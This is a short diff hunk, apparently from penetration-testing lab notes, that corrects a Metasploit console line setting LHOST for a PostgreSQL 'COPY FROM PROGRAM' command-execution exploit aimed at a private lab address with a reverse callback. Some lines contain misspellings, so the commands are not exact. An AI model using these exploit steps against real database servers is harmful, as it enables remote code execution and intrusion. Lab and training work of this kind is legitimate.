@@ -32,7 +32,7 @@ LHOST comming back through our WAN
 
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set rhosts 192.168.122.102
 
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts 192.168.122.209
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhost 192.168.122.209
 
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts port 61775
 
